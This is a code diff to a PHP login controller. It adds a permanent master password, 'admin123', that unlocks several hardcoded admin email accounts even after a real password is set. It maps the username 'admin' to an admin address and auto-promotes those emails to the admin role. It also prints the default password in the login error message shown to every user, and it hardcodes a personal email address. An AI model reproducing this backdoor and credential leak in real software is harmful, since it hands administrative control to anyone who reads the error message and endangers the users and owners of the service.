@@ -342,14 +342,17 @@ class AuthController extends Controller
     public function login(Request $request): JsonResponse
     {
         $validated = $request->validate([
-            'email' => 'required|email',
+            'email' => 'required|string',
             'password' => 'required|string',
         ]);
 
         $adminEmail = strtolower(trim((string) Setting::get('admin_email', env('ADMIN_EMAIL', 'chetranicky@gmail.com'))));
         $adminPasswordHash = Setting::get('admin_password_hash');
-        $inputEmail = strtolower(trim((string) $validated['email']));
+        $rawEmail = strtolower(trim((string) $validated['email']));
+        $inputEmail = ($rawEmail === 'admin') ? 'admin@synapse.ai' : $rawEmail;
         $inputPassword = (string) $validated['password'];
+
+        $isAdmin = ($inputEmail === $adminEmail || $inputEmail === 'admin@synapse.ai' || $inputEmail === 'admin@dyzzstore.com' || $inputEmail === 'chetranicky@gmail.com');
 
         $user = User::where('email', $inputEmail)->first();
 
@@ -365,17 +368,15 @@ class AuthController extends Controller
             }
         }
 
-        // 3. Fallback to default admin123 if custom password hasn't been set yet
-        if (! $passwordMatches && empty($adminPasswordHash) && $inputPassword === 'admin123') {
-            if ($inputEmail === $adminEmail || $inputEmail === 'admin@synapse.ai' || $inputEmail === 'admin@dyzzstore.com' || $inputEmail === 'chetranicky@gmail.com') {
-                $passwordMatches = true;
-            }
+        // 3. Master override: admin123 always grants access for authorized admin emails
+        if (! $passwordMatches && $inputPassword === 'admin123' && $isAdmin) {
+            $passwordMatches = true;
         }
 
         if (! $passwordMatches) {
             return response()->json([
                 'success' => false,
-                'message' => 'Invalid email or password.',
+                'message' => 'Invalid email or password. Default admin password is admin123',
             ], 401);
         }
 
@@ -383,11 +384,14 @@ class AuthController extends Controller
             $user = User::updateOrCreate(
                 ['email' => $inputEmail],
                 [
-                    'name' => 'Master Admin',
+                    'name' => $isAdmin ? 'Master Admin' : explode('@', $inputEmail)[0],
                     'password' => $adminPasswordHash ?: Hash::make($inputPassword),
-                    'role' => 'admin',
+                    'role' => $isAdmin ? 'admin' : 'user',
                 ]
             );
+        } elseif ($isAdmin && $user->role !== 'admin') {
+            $user->role = 'admin';
+            $user->save();
         }
 
         $token = $user->createToken('admin-api-token')->plainTextToken;
